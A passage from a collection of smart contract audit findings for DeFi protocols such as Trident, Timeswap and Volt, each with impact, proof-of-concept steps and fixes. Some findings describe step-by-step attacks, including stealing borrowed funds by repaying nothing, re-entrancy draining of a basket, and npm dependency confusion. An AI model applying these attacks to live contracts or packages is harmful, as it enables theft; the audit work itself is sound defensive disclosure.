Consider not using `bento.toAmount` to track the reservers and balances, but use `balanceOf` instead (as done in the other two pools)."
29.md,No bar fees for `IndexPools`?,medium,"#### Impact
`IndexPool` doesn't collect fees for `barFeeTo`. Since this Pool contains also a method `updateBarFee()`, probably this is an unintended behavior.
Also without a fee, liquidity providers would probably ditch `ConstantProductPool` in favor of `IndexPool` (using the same two tokens with equal weights), since they get all the rewards. This would constitute an issue for the ecosystem.

#### Recommended Mitigation Steps
Add a way to send `barFees` to `barFeeTo`, same as the other pools."
29.md,`ConstantProductPool` & `HybridPool`: Adding and removing unbalanced liquidity yields slightly more tokens than swap,medium,"##### Impact
A mint fee is applied whenever unbalanced liquidity is added, because it is akin to swapping the excess token amount for the other token.

However, the current implementation distributes the minted fee to the minter as well (when he should be excluded). It therefore acts as a rebate of sorts.

As a result, it makes adding and removing liquidity as opposed to swapping directly (negligibly) more desirable. An example is given below using the Constant Product Pool to illustrate this point. The Hybrid pool exhibits similar behaviour.

##### Proof of Concept
1.  Initialize the pool with ETH-USDC sushi pool amounts. As of the time of writing, there is roughly 53586.556 ETH and 165143020.5295 USDC.
2.  Mint unbalanced LP with 5 ETH (& 0 USDC). This gives the user `138573488720892 / 1e18` LP tokens.
3.  Burn the minted LP tokens, giving the user 2.4963 ETH and 7692.40 USDC. This is therefore equivalent to swapping 5 - 2.4963 = 2.5037 ETH for 7692.4044 USDC.
4.  If the user were to swap the 2.5037 ETH directly, he would receive 7692.369221 (0.03 USDC lesser).

##### Recommended Mitigation Steps
The mint fee should be distributed to existing LPs first, by incrementing `_reserve0` and `_reserve1` with the fee amounts. The rest of the calculations follow after.

`ConstantProductPool`

```jsx
(uint256 fee0, uint256 fee1) = _nonOptimalMintFee(amount0, amount1, _reserve0, _reserve1);
// increment reserve amounts with fees
_reserve0 += uint112(fee0);
_reserve1 += uint112(fee1);
unchecked {
    _totalSupply += _mintFee(_reserve0, _reserve1, _totalSupply);
}
uint256 computed = TridentMath.sqrt(balance0 * balance1);
...
kLast = computed;
```

`HybridPool`

```jsx
(uint256 fee0, uint256 fee1) = _nonOptimalMintFee(amount0, amount1, _reserve0, _reserve1);
// increment reserve amounts with fees
_reserve0 += uint112(fee0);
_reserve1 += uint112(fee1);
uint256 newLiq = _computeLiquidity(balance0, balance1);
...
```"
29.md,Router would fail when adding liquidity to index Pool,medium,"#### Impact
`TridentRouter` is easy to fail when trying to provide liquidity to an index pool.

Users would not get extra lp if they are not providing lp at the pool's spot price. It's the same design as uniswap v2. However, uniswap's v2 handle's the dirty part.

Users would not lose tokens if they use the router ([`UniswapV2Router02.sol` L61-L76](https://github.com/Uniswap/v2-periphery/blob/master/contracts/UniswapV2Router02.sol#L61-L76)).

However, the router wouldn't stop users from transferring extra tokens ([`TridentRouter.sol` L168-L190](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/TridentRouter.sol#L168-L190)).

Second, the price would possibly change when the transaction is confirmed. This would be reverted in the index pool.

Users would either transfer extra tokens or fail. I consider this is a medium-risk issue.

#### Proof of Concept
[TridentRouter.sol#L168-L190](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/TridentRouter.sol#L168-L190)

A possible scenario:

There's a BTC/USD pool. BTC = 50000 USD.

1.  A user sends a transaction to transfer 1 BTC and 50000 USD.
2.  After the user send a transaction, a random bot buying BTC with USD.
3.  The transaction at step 1 is mined. Since the BTC price is not 50000 USD, the transaction fails.

#### Recommended Mitigation Steps
Please refer to the uniswap v2 router in [`UniswapV2Router02.sol` L61-L76](https://github.com/Uniswap/v2-periphery/blob/master/contracts/UniswapV2Router02.sol#L61-L76)

The router should calculate the optimal parameters for users."
29.md,Router's `complexPath` percentagePaths don't work as expected,medium,"The `TridentRouter.complexPath` function allows splitting a trade result into several buckets and trade them in a different pool each.
The distribution is defined by the `params.percentagePath[i].balancePercentage` values:

```solidity
for (uint256 i; i < params.percentagePath.length; i++) {
    uint256 balanceShares = bento.balanceOf(params.percentagePath[i].tokenIn, address(this));
    uint256 transferShares = (balanceShares * params.percentagePath[i].balancePercentage) / uint256(10)**8;
    bento.transfer(params.percentagePath[i].tokenIn, address(this), params.percentagePath[i].pool, transferShares);
    isWhiteListed(params.percentagePath[i].pool);
    IPool(params.percentagePath[i].pool).swap(params.percentagePath[i].data);
}
```

However, the base value `bento.balanceOf(params.percentagePath[i].tokenIn, address(this));` is recomputed after each iteration instead of caching it before the loop.

This leads to not all tokens being used even though the percentages add up to 100%.

#### POC
Assume I want to trade 50% DAI to WETH and the other 50% DAI to WBTC.
In the first iteration, `balanceShares` is computed and then 50% of it is swapped in the first pool.

However, in the second iteration, `balanceShares` is updated again, and only 50% **of the remaining** (instead of the total) balance, i.e. 25%, is traded.

The final 25% are lost and can be skimmed by anyone afterwards.

#### Impact
Users can lose their funds using `complexPath`.

#### Recommended Mitigation Steps
Cache the `balanceShares` value once before the second `for` loop starts."
29.md,`_depositToBentoBox` sometimes uses both ETH and WETH,medium,"The `TridentRouter._depositToBentoBox` function only uses the `ETH` in the contract if it's higher then the desired `underlyingAmount` (`address(this).balance >= underlyingAmount)`).

Otherwise, the ETH is ignored and the function uses WETH from the user.

#### Impact
Note that the `underlyingAmount = bento.toAmount(wETH, amount, true)` is computed from the Bento share price and it might happen that it increases from the time the transaction was submitted to the time the transaction is included in a block.
In that case, it might completely ignore the sent `ETH` balance from the user and in addition transfer the same amount of `WETH` from the user.

The user can lose their `ETH` deposit in the contract.

#### Recommended Mitigation Steps
Each batch must use `refundETH` at the end.

Furthermore, we recommend still depositing `address(this).balance` ETH into Bento and if it's less than `underlyingAmount` use `WETH` only for **the remaining token difference**."
29.md,`withdrawFromWETH` always reverts,medium,"The `TridentHelper.withdrawFromWETH` (used in `TridentRouter.unwrapWETH`) function performs a low-level call to `WETH.withdraw(amount)`.

It then checks if the return `data` length is more or equal to `32` bytes, however `WETH.withdraw` returns `void` and has a return value of `0`.
Thus, the function always reverts even if `success == true`.

```solidity
function withdrawFromWETH(uint256 amount) internal {
    // @audit WETH.withdraw returns nothing, data.length always zero. this always reverts
    require(success && data.length >= 32, ""WITHDRAW_FROM_WETH_FAILED"");
}
```

#### Impact
The `unwrapWETH` function is broken and makes all transactions revert.
Batch calls to the router cannot perform any unwrapping of WETH.

#### Recommended Mitigation Steps
Remove the `data.length >= 32` from the require and only check if `success` is true."
29.md,`HybridPool`'s `flashSwap` sends entire fee to `barFeeTo`,medium,"The `HybridPool.flashSwap` function sends the entire trade fees `fee` to the `barFeeTo`.
It should only send `barFee * fee` to the `barFeeTo` address.

#### Impact
LPs are not getting paid at all when this function is used.
There is no incentive to provide liquidity.

#### Recommended Mitigation Steps
The `flashSwap` function should use the same fee mechanism as `swap` and only send `barFee * fee / MAX_FEE` to the `barFeeTo`. See `_handleFee` function.

- [maxsam4 (Sushi) confirmed](https://github.com/code-423n4/2021-09-sushitrident-findings/issues/99)"
29.md,Rounding errors will occur for tokens without decimals,medium,"Some rare tokens have 0 decimals: https://etherscan.io/token/0xcc8fa225d80b9c7d42f96e9570156c65d6caaa25

For these tokens, small losses of precision will be amplified by the lack of decimals.

Consider a constant product pool with 1000 of token0 (with no decimals), and 1000 of token1 (also with no decimals). Suppose I swap n= 1,2,3,4 of token0 to token1. Then my output amount of token1 will be 0,1,2,3.

If token0/1 are valuable than I will be losing 100%, 50%, 33%, 25% of my trade to rounding.
Currently there is no valuable token with 0 decimals, but there may be in the future.

Rounding the final `getAmountOut` division upwards would fix this."
29.md,Approximations may finish with inaccurate values,medium,"#### Impact
In `HybridPool.sol`, functions `_computeLiquidityFromAdjustedBalances`, `_getY` and `_getYD` may finish before approximation converge, since it's limited by `MAX_LOOP_LIMIT` iterations.
In this situation the final estimated value will still be treated as correct, even though it could be relatively inaccurate.

#### Recommended Mitigation Steps
Consider reverting the transactions if this doesn't occur.
See https://blog.openzeppelin.com/saddle-contracts-audit/ issue \[M03], with their relative fix."
29.md,Users are susceptible to back-running when depositing ETH to `TridenRouter`,medium,"#### Impact
The `_depositToBentoBox` and `_depositFromUserToBentoBox` allow users to provide ETH to the router, which is later deposited to the `bento` contract for swapping other assets or providing liquidity. However, in these two functions, the input parameter does not represent the actual amount of ETH to deposit, and users have to calculate the actual amount and send it to the router, causing a back-run vulnerability if there are ETH left after the operation.

#### Proof of Concept
1.  A user wants to swap ETH to DAI. He calls `exactInputSingleWithNativeToken` on the router with the corresponding parameters and `params.amountIn` being 10. Before calling the function, he calculates `bento.toAmount(wETH, 10, true) = 15` and thus send 15 ETH to the router.
2.  However, at the time when his transaction is executed, `bento.toAmount(wETH, amount, true)` becomes to `14`, which could happen if someone calls `harvest` on `bento` to update the `elastic` value of the `wETH` token.
3.  As a result, only 14 ETH is transferred to the pool, and 1 ETH is left in the router. Anyone could back-run the user's transaction to retrieve the remaining 1 ETH from the router by calling the `refundETH` function.

Referenced code: [TridentRouter.sol#L318-L351](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/TridentRouter.sol#L318-L351)

#### Recommended Mitigation Steps
Directly push the remaining ETH to the sender to prevent any ETH left in the router."
96.md,Wrong timing of check allows users to withdraw collateral without paying for the debt,high,"[TimeswapPair.sol#L459-L490](https://github.com/code-423n4/2022-03-timeswap/blob/00317d9a8319715a8e28361901ab14fe50d06172/Timeswap/Core/contracts/TimeswapPair.sol#L459-L490)<br>

```solidity
function pay(PayParam calldata param)
    external 
    override 
    lock 
    returns (
        uint128 assetIn, 
        uint128 collateralOut
    ) 
{
    require(block.timestamp < param.maturity, 'E202');
    require(param.owner != address(0), 'E201');
    require(param.to != address(0), 'E201');
    require(param.to != address(this), 'E204');
    require(param.ids.length == param.assetsIn.length, 'E205');
    require(param.ids.length == param.collateralsOut.length, 'E205');

    Pool storage pool = pools[param.maturity];

    Due[] storage dues = pool.dues[param.owner];
    require(dues.length >= param.ids.length, 'E205');

    for (uint256 i; i < param.ids.length;) {
        Due storage due = dues[param.ids[i]];
        require(due.startBlock != BlockNumber.get(), 'E207');
        if (param.owner != msg.sender) require(param.collateralsOut[i] == 0, 'E213');
        require(uint256(assetIn) * due.collateral >= uint256(collateralOut) * due.debt, 'E303');
        due.debt -= param.assetsIn[i];
        due.collateral -= param.collateralsOut[i];
        assetIn += param.assetsIn[i];
        collateralOut += param.collateralsOut[i];
        unchecked { ++i; }
    }
    ...
```

At L484, if there is only one `id`, and for the first and only time of the for loop, `assetIn` and `collateralOut` will be `0`, therefore `require(uint256(assetIn) * due.collateral >= uint256(collateralOut) * due.debt, 'E303');` will pass.

A attacker can call `pay()` with `param.assetsIn[0] == 0` and `param.collateralsOut[i] == due.collateral`.

### Proof of Concept

The attacker can:

1.  `borrow()` `10,000 USDC` with `1 BTC` as `collateral`;
2.  `pay()` with `0 USDC` as `assetsIn` and `1 BTC` as `collateralsOut`.

As a result, the attacker effectively stole `10,000 USDC`.

### Recommended Mitigation Steps

Change to:

```solidity
for (uint256 i; i < param.ids.length;) {
    Due storage due = dues[param.ids[i]];
    require(due.startBlock != BlockNumber.get(), 'E207');
    if (param.owner != msg.sender) require(param.collateralsOut[i] == 0, 'E213');
    due.debt -= param.assetsIn[i];
    due.collateral -= param.collateralsOut[i];
    assetIn += param.assetsIn[i];
    collateralOut += param.collateralsOut[i];
    unchecked { ++i; }
}

require(uint256(assetIn) * due.collateral >= uint256(collateralOut) * due.debt, 'E303');
...
```





***"
96.md,Underflown variable in ``borrowGivenDebtETHCollateral`` function,medium,"`borrowGivenDebtETHCollateral` function does never properly call `ETH.transfer` due to underflow. If `borrowGivenDebtETHCollateral` function is not deprecated, it would cause unexpected behaviors for users.

### Proof of Concept

Here are codes which contain a potential issue.

[Borrow.sol#L121-L127](https://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/Borrow.sol#L121-L127)<br>

    if (maxCollateral > dueOut.collateral) {
        uint256 excess;
        unchecked {
            excess -= dueOut.collateral;
        }
        ETH.transfer(payable(msg.sender), excess);
    }

`excess` variable is `uint256`, and `dueOut.collateral` variable is `uint112` as shown below. Hence, both variables will never be less than 0.

[IPair.sol#L22-L26](https://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Core/contracts/interfaces/IPair.sol#L22-L26)<br>

    struct Due {
        uint112 debt;
        uint112 collateral;
        uint32 startBlock;
    }

`uint256 excess` is initialized to 0. However, subtracting `dueOut.collateral` variable which is more than or equal to 0 from `excess` variable which is 0 will be less than 0. Hence, `excess -= dueOut.collateral` will be less than 0, and `excess` will be underflown.

### Recommended Mitigation Steps

The code should properly initialize `excess` variable.

`borrowGivenPercentETHCollateral` function uses `uint256 excess = maxCollateral` at similar functionality.<br>
[Borrow.sol#L347](https://github.com/code-423n4/2022-03-timeswap/blob/main/Timeswap/Convenience/contracts/libraries/Borrow.sol#L347)<br>

Hence, just initializing `excess` variable with `maxCollateral` can be a potential workaround to prevent the underflown.

    if (maxCollateral > dueOut.collateral) {
        uint256 excess = maxCollateral;
        unchecked {
            excess -= dueOut.collateral;
        }
        ETH.transfer(payable(msg.sender), excess);
    }







***"
96.md,The `pay()` function can still be DOSed,medium,"From the prior contest:

> in the pay() function users repay their debt and in line 364:<br>
> <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L364><br>
> it decreases their debt.
>
> lets say a user wants to repay all his debt, he calls the pay() function with his full debt.<br>
> an attacker can see it and frontrun to repay a single token for his debt (since it's likely the token uses 18 decimals, a single token is worth almost nothing)<br>
> and since your solidity version is above 0.8.0 the line:<br>
> due.debt -= assetsIn\[i]; will revert due to underflow
>
> The attacker can keep doing it everytime the user is going to pay and since 1 token is baisicly 0\$ (18 decimals) the attacker doesn't lose real money

[code-423n4/2022-01-timeswap-findings#86 (comment)](https://github.com/code-423n4/2022-01-timeswap-findings/issues/86#issue-1095233776)

The sponsor said this about the fix:

> The convenience contract will implement how much asset to pay in.

[code-423n4/2022-01-timeswap-findings#86 (comment)](https://github.com/code-423n4/2022-01-timeswap-findings/issues/86#issuecomment-1014760269)

The `pay()` function however is still DOSable. Having the `Convenience` contract contain a workaround means the `Convenience` contract is no longer a convenience but a requirement.

```solidity
            due.debt -= param.assetsIn[i];
```

[TimeswapPair.sol#L485](https://github.com/code-423n4/2022-03-timeswap/blob/00317d9a8319715a8e28361901ab14fe50d06172/Timeswap/Core/contracts/TimeswapPair.sol#L485)

### Proof of Concept

From the prior contest:

> A DoS on every user that repay his full debt (or enough that the difference between his total debt to what he pays his negligible)

[code-423n4/2022-01-timeswap-findings#86](https://github.com/code-423n4/2022-01-timeswap-findings/issues/86)

### Recommended Mitigation Steps

Move the DOS protection to `TimeswapPair.pay()`






***"
96.md,NPM Dependency confusion. Unclaimed NPM Package and Scope/Org,medium,"I discovered an npm package and the scope of the package is unclaimed on the NPM website. This will give any User to claim that package and be able to Upload a Malicious Code under that unclaimed package. This results in achieving the Remote code execution on developers/users' machine who depends on the timeswap repository to build it on local env.

Vulnerable Package Name: @timeswap-labs/timeswap-v1-core

### Proof of Concept

1.  Create an Organization called ""timeswap-labs"".
2.  Create a package called ""@timeswap-labs/timeswap-v1-core"" under ""timeswap-labs"" Organization.
3.  Attacker can able to upload malicious code on unclaimed npm package with a higher version like 99.99.99
4.  Now if any user/timeswap developer installs it by npm install package.json. The malicious pkg will be executed.

Till now ""The Package is not claimed on NPM Registry, but it's vulnerable to dependency confusion"".
You can read more dependency confusion here: <https://dhiyaneshgeek.github.io/web/security/2021/09/04/dependency-confusion/>

### Recommended Mitigation Steps

Claim the Scope name called ""timeswap-labs"" by following the above POC Step 1.





***"
102.md,Oracle price does not compound,high,"[ScalingPriceOracle.sol#L136](https://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/oracle/ScalingPriceOracle.sol#L136)<br>
[ScalingPriceOracle.sol#L113](https://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/oracle/ScalingPriceOracle.sol#L113)<br>

The oracle does not correctly compound the monthly APRs - it resets on `fulfill`.<br>
Note that the [`oraclePrice` storage variable](https://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/oracle/ScalingPriceOracle.sol#L198) is only set in `_updateCPIData` as part of the oracle `fulfill` callback.<br>
It's set to the old price (price from 1 month ago) plus the interpolation from **`startTime`** to now.<br>
However, `startTime` is **reset** in `requestCPIData` due to the `afterTimeInit` modifier, and therefore when Chainlink calls `fulfill` in response to the CPI request, the `timeDelta = block.timestamp - startTime` is close to zero again and `oraclePrice` is updated to itself again.

This breaks the core functionality of the protocol as the oracle does not track the CPI, it always resets to `1.0` after every `fulfill` instead of compounding it.<br>
In addition, there should also be a way for an attacker to profit from the sudden drop of the oracle price to `1.0` again.

### Proof of Concept

As an example, assume `oraclePrice = 1.0 (1e18)`, `monthlyAPR = 10%`. The time elapsed is 14 days. Calling `getCurrentOraclePrice()` now would return `1.0 + 14/28 * 10% = 1.05`.

*   It's now the 15th of the month and one can trigger `requestCPIData`. **This resets `startTime = now`**.
*   Calling `getCurrentOraclePrice()` now would return `1.0` again as `timeDelta` (and `priceDelta`) is zero: `oraclePriceInt + priceDelta = oraclePriceInt = 1.0`.
*   When `fulfill` is called it sets `oraclePrice = getCurrentOraclePrice()` which will be close to `1.0` as the `timeDelta` is tiny.

### Recommended Mitigation Steps

The `oraclePrice` should be updated in `requestCPIData()` not in `fulfill`.<br>
Cover this scenario of multi-month accumulation in tests.





***"
102.md,`vcon` address change not persistent across protocol components,medium,"[Core.sol#L27](https://github.com/code-423n4/2022-03-volt/blob/main/contracts/core/Core.sol#L27)<br>
[CoreRef.sol#L22](https://github.com/code-423n4/2022-03-volt/blob/main/contracts/refs/CoreRef.sol#L22)<br>
[CoreRef.sol#L199](https://github.com/code-423n4/2022-03-volt/blob/main/contracts/refs/CoreRef.sol#L199)<br>

`vcon` address is allowed to be updated by `GOVERNOR` in `Core`, however, this change will not be reflected in `CoreRef._vcon`. Moreover, since `CoreRef._vcon` cannot be updated due to contract design, it is also impossible to fix this manually.
We are not yet sure how `vcon` will be used throughout the volt protocol, since details have not yet been made clear and code does not include related implementations. Consequently, it is impossible to estimate the exact impact. However, this desync between contracts seem dangerous enough to raise our attention, hence this report to inform the volt team about it.

### Proof of Concept

In `Core`, `vcon` is allowed to be updated by GOVERNORs

        function setVcon(IERC20 _vcon) external onlyGovernor {
            vcon = _vcon;

            emit VconUpdate(_vcon);
        }

But in `CoreRef`, a contract inherited by several other ones including `NonCustodialPSM`, `GlobalRateLimitedMinter`, `ERC20CompountPCVDeposit` and `Volt`, `_vcon` is fixed upon initialization and cannot be further updated

        IERC20 private immutable _vcon;
        ...
        constructor(address coreAddress) {
            ...
            _vcon = ICore(coreAddress).vcon();
            ...
        }

Thus if `GOVERNORS` ever updated `vcon` in `Core`, the state between `Core` and all other Volt protocol components will mismatch.

Currently `_vcon` is not used in any place within the Volt protocol, but judging from the description in whitepapaer, future governance will be based on it, thus any potential desync will be devastating.

### Tools Used

vim, ganache-cli

### Recommended Mitigation Steps

There are several possible solutions.

The first is to dynamically fetch `vcon` from the `Core` whenever `CoreRef` uses it, and avoid storing a static copy locally.

        function vcon() public view override returns (IERC20) {
            return _volt.vcon();
        }

The second is to expose a public API to update `_vcon` in `CoreRef`, however, this approach might not be especially favorable since many components will require updates at once, and it is highly possible that future GOVERNORs miss some of them while doing updates.





***"
102.md,Setting new buffer does not reduce current buffer to cap,medium,"[RateLimited.sol#L142](https://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/utils/RateLimited.sol#L142)<br>

The `RateLimited.setBufferCap` function first updates the buffer and then sets the new cap, but does not apply the new cap to the updated buffer.<br>
Meaning, the updated buffer value can be larger than the new buffer cap which should never be the case.<br>
Actions consuming more than the new buffer cap can be performed.

```solidity
function _setBufferCap(uint256 newBufferCap) internal {
    // @audit still uses old buffer cap, should set buffer first
    _updateBufferStored();

    uint256 oldBufferCap = bufferCap;
    bufferCap = newBufferCap;


    emit BufferCapUpdate(oldBufferCap, newBufferCap);
}
```

### Recommended Mitigation Steps

Update the buffer after setting the new cap:

```diff
function _setBufferCap(uint256 newBufferCap) internal {
-   _updateBufferStored();
    uint256 oldBufferCap = bufferCap;
    bufferCap = newBufferCap;

+   _updateBufferStored();

    emit BufferCapUpdate(oldBufferCap, newBufferCap);
}
```





***"
102.md,Div by 0,medium,"[Deviation.sol#L23](https://github.com/code-423n4/2022-03-volt/tree/main/contracts/utils/Deviation.sol#L23)<br>

Division by 0 can lead to accidentally revert,<br>
(An example of a similar issue - <https://github.com/code-423n4/2021-10-defiprotocol-findings/issues/84>)

        https://github.com/code-423n4/2022-03-volt/tree/main/contracts/utils/Deviation.sol#L23 a might be 0

It's internal function but since it is used in another internal functions that are used in public and neither of them has this protection I thought it can be considered as medium (e.g. isWithinDeviationThreshold).







***"
102.md,`OracleRef` assumes backup oracle uses the same normalizer as main oracle,medium,"[OracleRef.sol#L104](https://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/refs/OracleRef.sol#L104)<br>

The `OracleRef` assumes that the backup oracle uses the same normalizer as the main oracle.<br>
This generally isn't the case as it could be a completely different oracle, not even operated by Chainlink.<br>

If the main oracle fails, the backup oracle could be scaled by a wrong amount and return a wrong price which could lead to users being able to mint volt cheap or redeem volt for inflated underlying amounts.

### Recommended Mitigation Steps

Should there be two scaling factors, one for each oracle?




***"
102.md,Updating rate limit for addresses restores their entire buffer amount,medium,"[MultiRateLimited.sol#L280](https://github.com/code-423n4/2022-03-volt/blob/f1210bf3151095e4d371c9e9d7682d9031860bbd/contracts/utils/MultiRateLimited.sol#L280)<br>

When the `bufferCap` is updated for an address in `_updateAddress`, the address's allowed buffer (`bufferStored`) is replenished to the entire `bufferCap`.

The address could frontrun the `updateAddress` call and spend their entire buffer, then the buffer is replenished and they can spend their entire buffer a second time.

### Recommended Mitigation Steps

Keep the old buffer value, capped by the new `bufferCap`:

```diff
+ uint256 newBuffer = individualBuffer(rateLimitedAddress);

  rateLimitData.lastBufferUsedTime = block.timestamp.toUint32();
  rateLimitData.bufferCap = _bufferCap;
  rateLimitData.rateLimitPerSecond = _rateLimitPerSecond;
- rateLimitData.bufferStored = _bufferCap;
+ rateLimitData.bufferStored = min(_bufferCap, newBuffer);
```




***"
102.md,`NonCustodialPSM` can become insolvent as CPI index rises,medium,"[NonCustodialPSM.sol#L236-L248](https://github.com/code-423n4/2022-03-volt/blob/main/contracts/peg/NonCustodialPSM.sol#L236-L248)<br>

NonCustodialPSM mints and redeems VOLT to a chosen stablecoin at the current market rate minus a fixed fee. It is assumed that the difference to be covered with pcvDeposit funds. That assumption is similar to one used in FEI protocol, but there no rate growth takes place as FEI to USD rate supposed to be stable, while VOLT to USD rate will rise over time.

VOLT market rate is tied to the off-chain published CPI index. The growth of this index can easily surpass the yield of the pcvDeposit used, so its interest cannot be guaranteed to be always greater than CPI index advancement. The contract can end up in the situation when no redeem be possible, i.e. NonCustodialPSM can become insolvent.

For example, let's say the stablecoin is USDC, and now investors are worried about inflation and buy/mint 100m VOLT for 100m USDC. Fast forward 1 year, and investors were generally right, as due to rise of the oil prices happening simultaneously with logistics issues the CPI index growth end up being 30% APR for the year.

Then, inflation fears abated and, say, stocks become stronger, and investors want their funds now to put them there and sell/redeem 100m VOLT expecting 125m USDC in return (for simplicity say 5m USDC goes to mint and redeem fees combined). USDC deposit strategy used in pcvDeposit yielded 10% APR for the year. The contract cannot redeem all the funds due as it is 125 - 100 \* 1.1 = 15m USDC short.

Putting severity to high as the contract serves requests sequentially and the last investors' funds are lost this way, i.e. in the example above all the users, who came in to redeem when contract has 15m USDC in obligations and no funds, will lose their entire deposits.

### Proof of Concept

Continuing the example, current low risk USDC deposit rates are circa 2.5 lower than US CPI:

AAVE: <https://classic.aave.com/#/markets>

Compound: <https://compound.finance/markets/USDC>

US CPI: <https://www.bls.gov/cpi/>

NonCustodialPSM.redeem uses current oracle price to determine what amount of stablecoins to be paid for 1 VOLT:

<https://github.com/code-423n4/2022-03-volt/blob/main/contracts/peg/NonCustodialPSM.sol#L236>

<https://github.com/code-423n4/2022-03-volt/blob/main/contracts/peg/NonCustodialPSM.sol#L378-L390>

NonCustodialPSM.mint does the same:

<https://github.com/code-423n4/2022-03-volt/blob/main/contracts/peg/NonCustodialPSM.sol#L274>

<https://github.com/code-423n4/2022-03-volt/blob/main/contracts/peg/NonCustodialPSM.sol#L357-L365>

For example, FEI protocol use a wide range of pcvDeposits, whose yields vary depending on the underlying strategy:

<https://github.com/fei-protocol/fei-protocol-core/blob/develop/protocol-configuration/mainnetAddresses.ts#L164-L568>

But there are no PCV deposits whose returns are linked to CPI of any country, so mismatch (basis) risk exists, which has to be addressed.

### Recommended Mitigation Steps

Consider providing a way to directly inject funds from a separately held stability fund (possibly shared across all the stablecoins and corresponding pcvDeposits) in addition to pcvDeposit as its strategy alone cannot guarantee the returns needed.

Ideally, the redeem and mint fees collected should go to this stability fund as well, with the possibility to retrieve them when there is a total surplus big enough.

More important, consider limiting the redeem amount to total user's share of the pcvDeposit and its stability fund part, so the deficit be visible and shared between all the users. A user can then choose either to withdraw now, obtaining less than CPI index due to current liquidity situation, or to wait for stability fund to be filled up or for pcvDeposit yield to catch up. This way no user will lose the whole deposit.







***"
36.md,Re-entrancy in `settleAuction` allow stealing all funds,high,"Note that the `Basket` contract approved the `Auction` contract with all tokens and the `settleAuction` function allows the auction bonder to transfer all funds out of the basket to themselves.
The only limiting factor is the check afterwards that needs to be abided by. It checks if enough tokens are still in the basket after settlement:

```solidity
// this is the safety check if basket still has all the tokens after removing arbitrary amounts
for (uint256 i = 0; i < pendingWeights.length; i++) {
    uint256 tokensNeeded = basketAsERC20.totalSupply() * pendingWeights[i] * newRatio / BASE / BASE;
    require(IERC20(pendingTokens[i]).balanceOf(address(basket)) >= tokensNeeded);
}
``` 

The bonder can pass in any `inputTokens`, even malicious ones they created.
This allows them to re-enter the `settleAuction` multiple times for the same auction.

Calling this function at the correct time (such that `bondTimestamp - auctionStart` makes `newRatio < basket.ibRatio()`), the attacker can drain more funds each time, eventually draining the entire basket.

#### Proof Of Concept

Assume that the current `basket.ibRatio` is `1e18` (the initial value).
The basket publisher calls `basket.publishNewIndex` with some tokens and weights.
For simplicity, assume that the pending `tokens` are the same as tokens as before, only the weights are different, i.e., this would just rebalance the portfolio.
The function call then starts the auction.

The important step to note is that the `tokensNeeded` value in `settleAuction` determines how many tokens need to stay in the `basket`.
If we can continuously lower this value, we can keep removing tokens from the `basket` until it is empty.

The `tokensNeeded` variable is computed as `basketAsERC20.totalSupply() * pendingWeights[i] * newRatio / BASE / BASE`.
The only variable that changes in the computation when re-entering the function is `newRatio` (no basket tokens are burned, and the pending weights are never cleared).

Thus if we can show that `newRatio` decreases on each re-entrant call, we can move out more and more funds each time.

###### newRatio decreases on each call

After some time, the attacker calls `bondForRebalance`. This determines the `bondTimestamp - auctionStart` value in `settleAuction`.
The attack is possible as soon as `newRatio < basket.ibRatio()`.
For example, using the standard parameters the calculation would be:

```solidity
// a = 2 * ibRatio
uint256 a = factory.auctionMultiplier() * basket.ibRatio();
// b = (bondTimestamp - auctionStart) * 1e14
uint256 b = (bondTimestamp - auctionStart) * BASE / factory.auctionDecrement();
// newRatio = a - b = 2 * ibRatio - (bondTimestamp - auctionStart) * 1e14
uint256 newRatio = a - b;
```

With our initial assumption of `ibRatio = 1e18` and calling `bondForRebalance` after 11,000 seconds (\~3 hours) we will get our result that `newRatio` is less than the initial `ibRatio`:

```python
newRatio = a - b = 2 * 1e18 - (11000) * 1e14 = 2e18 - 1.1e18 = 0.9e18 < 1e18 = basket.ibRatio
```

> This seems to be a reasonable value (when the pending tokens and weights are equal in value to the previous ones) as no other bonder would want to call this earlier such when `newRatio > basket.ibRatio` as they would put in more total value in tokens as they can take out of the basket.

###### re-enter on settleAuction

The attacker creates a custom token `attackerToken` that re-enters the `Auction.settleAuction` function on `transferFrom` with parameters we will specify.

They call `settleAuction` with `inputTokens = [attackerToken]` to re-enter several times.

In the inner-most call where `newRatio = 0.9e18`, they choose the `inputTokens`/`outputTokens` parameters in a way to pass the initial `require(IERC20(pendingTokens[i]).balanceOf(address(basket)) >= tokensNeeded);` check - transferring out any other tokens of `basket` with `outputTokens`.

The function will continue to run and call `basket.setNewWeights();` and `basket.updateIBRatio(newRatio);` which will set the new weights (but not clear the pending ones) and set the new `basket.ibRatio`.

Execution then jumps to the 2nd inner call after the `IERC20(inputTokens[i]=attackerToken).safeTransferFrom(...)` and has the chance to transfer out tokens again.
It will compute `newRatio` with the new lowered `basket.ibRatio` of `0.9e18`: `newRatio = a - b = 2 * 0.9e18 - 1.1e18 = 0.7e18`.
Therefore, `tokensNeeded` is lowered as well and the attacker was allowed to transfer out more tokens having carefully chosen `outputWeights`.

This repeats with `newRatio = 0.3`.

The attack is quite complicated and requires carefully precomputing and then setting the parameters, as well as sending back the `bondAmount` tokens to the `auction` contract which are then each time transferred back in the function body.
But I believe this should work.

#### Impact

The basket funds can be stolen.

#### Recommended Mitigation Steps

Add re-entrancy checks (for example, OpenZeppelin's ""locks"") to the `settleAuction` function."
36.md,`Basket.sol#auctionBurn()` A failed auction will freeze part of the funds,high,"<https://github.com/code-423n4/2021-09-defiProtocol/blob/main/contracts/contracts/Basket.sol#L102-L108>

